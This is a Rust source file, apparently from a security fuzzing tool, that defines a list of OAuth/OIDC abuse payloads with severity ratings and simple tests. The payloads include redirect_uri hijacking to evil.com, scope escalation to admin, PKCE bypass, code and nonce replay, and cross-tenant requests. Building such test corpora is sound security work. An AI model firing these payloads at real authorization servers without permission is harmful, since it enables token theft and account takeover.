#![allow(clippy::vec_init_then_push)]
//! Static OAuth/OIDC abuse payloads: redirect-URI manipulation, scope abuse,
//! PKCE weaknesses, and grant-type confusion.
//!
//! These are **data**. The OAuth *prober* — `OAuthFuzzer` and its live
//! `reqwest` endpoint discovery — stays in the `eggsec` engine, in
//! `eggsec::fuzzer::payloads::oauth`.

use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "redirect_uri=https://evil.com/callback".to_string(),
        description: "OAuth redirect_uri manipulation".to_string(),
        severity: Severity::Critical,
        tags: vec!["oauth".to_string(), "redirect".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "scope=*".to_string(),
        description: "Wildcard scope request".to_string(),
        severity: Severity::High,
        tags: vec!["oauth".to_string(), "scope".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "grant_type=authorization_code&code=test".to_string(),
        description: "Authorization code replay".to_string(),
        severity: Severity::High,
        tags: vec!["oauth".to_string(), "replay".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "response_type=token".to_string(),
        description: "Implicit flow (insecure)".to_string(),
        severity: Severity::Medium,
        tags: vec!["oauth".to_string(), "implicit".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "response_type=code&redirect_uri=https://evil.com".to_string(),
        description: "Missing state parameter (CSRF)".to_string(),
        severity: Severity::High,
        tags: vec!["oauth".to_string(), "csrf".to_string(), "state".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "code_challenge_method=plain&code_challenge=test".to_string(),
        description: "PKCE bypass with plain challenge method".to_string(),
        severity: Severity::High,
        tags: vec![
            "oauth".to_string(),
            "pkce".to_string(),
            "bypass".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "response_type=code".to_string(),
        description: "PKCE missing (no code_challenge)".to_string(),
        severity: Severity::Medium,
        tags: vec![
            "oauth".to_string(),
            "pkce".to_string(),
            "missing".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "scope=admin".to_string(),
        description: "Scope escalation to admin".to_string(),
        severity: Severity::Critical,
        tags: vec![
            "oauth".to_string(),
            "scope".to_string(),
            "escalation".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "scope=read write admin".to_string(),
        description: "Scope escalation with multiple scopes".to_string(),
        severity: Severity::Critical,
        tags: vec![
            "oauth".to_string(),
            "scope".to_string(),
            "escalation".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "redirect_uri=https://example.com/callback#access_token=leaked".to_string(),
        description: "Token leakage via Referer header".to_string(),
        severity: Severity::Critical,
        tags: vec![
            "oauth".to_string(),
            "leak".to_string(),
            "referer".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "client_id=app&client_secret=secret123&grant_type=authorization_code&code=abc"
            .to_string(),
        description: "Client credentials exposed in URL query".to_string(),
        severity: Severity::Critical,
        tags: vec![
            "oauth".to_string(),
            "credential-leak".to_string(),
            "url".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload:
            "redirect_uri=https://evil.com/callback&error=access_denied&error_description=denied"
                .to_string(),
        description: "Open redirect via OAuth error response".to_string(),
        severity: Severity::High,
        tags: vec![
            "oauth".to_string(),
            "redirect".to_string(),
            "error".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "grant_type=authorization_code&code=used_code_123".to_string(),
        description: "Token replay after logout".to_string(),
        severity: Severity::High,
        tags: vec![
            "oauth".to_string(),
            "replay".to_string(),
            "session".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "response_type=code&tenant_id=other_org".to_string(),
        description: "Cross-tenant token request".to_string(),
        severity: Severity::Critical,
        tags: vec![
            "oauth".to_string(),
            "multi-tenant".to_string(),
            "escalation".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "grant_type=password&username=admin&password=test".to_string(),
        description: "Grant type confusion (resource owner password)".to_string(),
        severity: Severity::High,
        tags: vec![
            "oauth".to_string(),
            "grant-type".to_string(),
            "deprecated".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "response_type=code".to_string(),
        description: "Missing redirect_uri parameter".to_string(),
        severity: Severity::Medium,
        tags: vec![
            "oauth".to_string(),
            "redirect".to_string(),
            "missing".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "redirect_uri=http://example.com/callback".to_string(),
        description: "HTTP redirect_uri (not HTTPS)".to_string(),
        severity: Severity::High,
        tags: vec![
            "oauth".to_string(),
            "redirect".to_string(),
            "tls".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "client_id=*".to_string(),
        description: "Wildcard client_id".to_string(),
        severity: Severity::High,
        tags: vec![
            "oauth".to_string(),
            "client".to_string(),
            "wildcard".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "grant_type=authorization_code&code=expired_code_here".to_string(),
        description: "Expired authorization code".to_string(),
        severity: Severity::Medium,
        tags: vec![
            "oauth".to_string(),
            "token".to_string(),
            "expired".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "grant_type=authorization_code&code=".to_string(),
        description: "Empty authorization code".to_string(),
        severity: Severity::Medium,
        tags: vec![
            "oauth".to_string(),
            "token".to_string(),
            "empty".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "response_type=code+token".to_string(),
        description: "Invalid response type (code+token)".to_string(),
        severity: Severity::Medium,
        tags: vec![
            "oauth".to_string(),
            "response-type".to_string(),
            "invalid".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::OAuth,
        payload: "response_type=code&nonce=used_nonce&state=abc".to_string(),
        description: "Nonce replay attack".to_string(),
        severity: Severity::High,
        tags: vec![
            "oauth".to_string(),
            "nonce".to_string(),
            "replay".to_string(),
        ],
    });

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty_and_labelled() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert_eq!(p.payload_type, PayloadType::OAuth);
            assert!(!p.payload.is_empty());
            assert!(!p.tags.is_empty());
        }
    }

    #[test]
    fn contains_redirect_uri_manipulation() {
        let payloads = get_payloads();
        assert!(
            payloads.iter().any(|p| p.payload.contains("redirect_uri=")),
            "the OAuth corpus must include redirect_uri manipulation"
        );
        assert!(
            payloads.iter().any(
                |p| p.payload.contains("response_type=token") && p.severity == Severity::Medium
            ),
            "implicit flow must be present and rated Medium"
        );
    }
}
